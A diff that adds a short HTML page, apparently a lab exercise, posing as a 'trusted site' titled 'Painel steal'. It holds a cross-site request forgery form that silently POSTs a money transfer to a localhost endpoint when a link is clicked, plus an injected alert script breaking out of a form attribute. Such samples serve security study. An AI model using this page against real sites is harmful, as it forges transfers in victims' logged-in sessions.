@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>site confiavel</title>
+</head>
+<body>
+	<h2> Painel steal <h2>
+	<form id="form" action="http://localhost:8080/transfer" method="POST">
+	<input type="hidden" name="amount" value=1"><script>alert('XSS')</script>
+	<a href="#" onclick=document.getElementById("form").submit()> link </a>		
+	</form>
+</body>
+</html>
+
